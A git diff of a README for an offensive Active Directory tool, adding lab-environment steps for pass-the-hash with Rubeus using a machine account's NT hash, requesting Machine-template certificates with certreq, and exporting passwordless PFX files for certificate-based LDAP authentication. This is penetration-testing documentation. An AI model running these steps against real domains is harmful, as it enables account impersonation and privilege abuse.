@@ -38,7 +38,7 @@ This fork alters [the initial code](https://github.com/The-Viper-One/Invoke-Pass
 
 Provide a certificate allowed to authenticate against an LDAP/S Server. 
 
-Otherwise, assuming a compromised user (resp. computer) has `Enrollment Rights` over the `User` (resp. `Computer`) certificate template (itself supporting the [`Client Authentication`](https://www.rfc-editor.org/rfc/rfc3280.html#section-4.2.1.13) [Extended Key Usage](https://learn.microsoft.com/fr-fr/openspecs/windows_protocols/ms-wcce/7785d392-44ce-44a2-b798-0eee3a129ebb)), we may request a certificate as follows.
+Otherwise, assuming a compromised user (resp. computer) has `Enrollment Rights` over the `User` (resp. `Machine`) certificate template (itself supporting the [`Client Authentication`](https://www.rfc-editor.org/rfc/rfc3280.html#section-4.2.1.13) [Extended Key Usage](https://learn.microsoft.com/fr-fr/openspecs/windows_protocols/ms-wcce/7785d392-44ce-44a2-b798-0eee3a129ebb)), we may request a certificate as follows.
 
 ### From Linux (certipy)
 
@@ -54,10 +54,19 @@ $ certipy-ad req -u '<user>@<domain>' -p '<password>' -target '<dc_fqdn>' -ca '<
 
 Using [`certreq`](https://github.com/GhostPack/Certify/issues/13#issuecomment-3622538862)
 
-#### Run a PowerShell Prompt as a domain user
+#### Run a PowerShell Prompt as a domain principal
+
+- Using a Password:
 
 ```powershell
 PS > runas /netonly /user:<domain>\<user> powershell.exe
+```
+
+- Using an NTHash:
+
+```powershell
+PS > Rubeus.exe createnetonly /program:powershell.exe /show
+PS (createnetonly) > Rubeus.exe asktgt /nowrap /domain:'<domain>' /dc:<dc_ip> /user:'<computer>$' /rc4:'<nthash>' /ptt
 ```
 
 #### Open the MMC, Add the `Certificates` Snap-in, and connect to a domain's computer
@@ -67,7 +76,7 @@ PS > runas /netonly /user:<domain>\<user> powershell.exe
 > This step is optional if the CA Issuer's certificate has already been trusted locally (e.g. installed into your local Microsoft Certificate Store).
 
 ```
-PS (runas) > mmc.exe /server:<dc_ip>
+PS (runas/createnetonly) > mmc.exe /server:<dc_ip>
 GUI > CTRL+M (i.e. File > Add/Remove Snap-in) > Certificates > Computer Account > Another computer > DC02 > Check Names
 GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
     Find in: \\DC02\Personal
@@ -76,10 +85,12 @@ GUI > Certificates (\\DC02) > \\DC02\Personal > Find Certificates...
     ADLAB-DC02-CA.cer > Install Certificate... > Current User & Local Machine > Automatically select the certificate store based on the type of certificate
 ```
 
-#### Based on the provided `*.inf` file, request a certificate in the PowerShell session running as the domain user (e.g. `Administrator`)
+#### Based on the provided `*.inf` file, create a request file, then request a certificate in the PowerShell session running as the domain principal
+
+- User INF file (e.g. `Administrator`):
 
 ```powershell
-PS (runas) > certreq -f -new Administrator.inf Administrator.req
+PS > certreq -f -new Administrator.inf Administrator.req
     Template not found.  Do you wish to continue anyway?
     User
     CertReq: Request Created
@@ -92,10 +103,34 @@ PS (runas) > certreq -f -submit -config "192.168.56.202\ADLAB-DC02-CA" Administr
     Certificate retrieved(Issued) Issued  0x80094004, The Enrollee (CN=Administrator,CN=Users,DC=ADLAB,DC=LOCAL) has no E-Mail name registered in the Active Directory.  The E-Mail name will not be included in the certificate.
 ```
 
-#### Install the requested certificate into the Microsoft Certificate Store
+- Computer INF file (e.g. `SRV01`):
 
 ```powershell
-PS (runas) > certreq -f -accept -user -config "192.168.56.202\ADLAB-DC02-CA" Administrator.rsp
+PS > certreq -f -new SRV01.inf SRV01.req
+Template not found.  Do you wish to continue anyway?
+Machine
+CertReq: Request Created
+```
+
+```powershell
+PS (createnetonly) > certreq -f -submit -config "DC02.ADLAB.LOCAL\ADLAB-DC02-CA" SRV01.req SRV01.cer
+RequestId: 71
+RequestId: "71"
+Certificate retrieved(Issued) Issued
+```
+
+> As we're dealing with Kerberos tickets, notice that we MUST use an FQDN in the latest command above (`DC02.ADLAB.LOCAL\` here, instead of `192.168.56.202\`).
+
+> Under the hood, we may see (using [`klist`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist)) that the `host/DC02.ADLAB.LOCAL` and `RPCSS/DC02.ADLAB.LOCAL` services' TGS tickets are requested and injected into our `createnetonly` PowerShell session.
+
+
+
+#### Install the requested certificate into the Microsoft Certificate Store
+
+- User:
+
+```powershell
+PS > certreq -f -accept -user Administrator.rsp
     Installed Certificate:
         Serial Number: 4d0000001c61b4cb31ef3c819a00000000001c
         Subject: CN=Administrator, CN=Users, DC=ADLAB,DC=LOCAL (Other Name:Principal Name=Administrator@ADLAB.LOCAL)
@@ -104,21 +139,36 @@ PS (runas) > certreq -f -accept -user -config "192.168.56.202\ADLAB-DC02-CA" Adm
         Thumbprint: 0e58848b07cf3b3b408ba2f57400ac5aae5f74d0
 ```
 
+- Computer:
+
+```powershell
+PS > certreq -f -accept -user SRV01.rsp
+    Installed Certificate:
+        Serial Number: 4d00000047f6f89f60477c233c000000000047
+        Subject: CN=SRV01.ADLAB.LOCAL (DNS Name=SRV01.ADLAB.LOCAL)
+        NotBefore: <DATE>
+        NotAfter: <DATE>
+        Thumbprint: 80923c919950680113e282c68ccadfd8dbd30e2e
+```
+
+
 #### Make sure the newly installed certificate has an exportable private key
 
 ```powershell
 PS > Get-ChildItem Cert:\CurrentUser\My | Where-Object { $_.HasPrivateKey }
 [...]
 0E58848B07CF3B3B408BA2F57400AC5AAE5F74D0  CN=Administrator, CN=Users, DC=ADLAB, DC=LOCAL
+80923C919950680113E282C68CCADFD8DBD30E2E  CN=SRV01.ADLAB.LOCAL
 ```
 
 #### Export the requested certificate into PFX format using [`Export-PfxCertificate`](https://learn.microsoft.com/en-us/powershell/module/pki/export-pfxcertificate)
 
 ```powershell
 PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\0E58848B07CF3B3B408BA2F57400AC5AAE5F74D0) -FilePath 'Administrator.pfx' -Password (New-Object System.Security.SecureString)
+PS > Export-PfxCertificate -Cert (Get-ChildItem Cert:\CurrentUser\My\80923C919950680113E282C68CCADFD8DBD30E2E) -FilePath 'SRV01.pfx' -Password (New-Object System.Security.SecureString)
 ```
 
-> Here, both (i.e. either from Linux, or Windows) exported certificates are passwordless.
+> Here, both exported certificates (i.e. either from Linux, or Windows) are passwordless.
 
 
 ## Usage - PassTh4'Cert
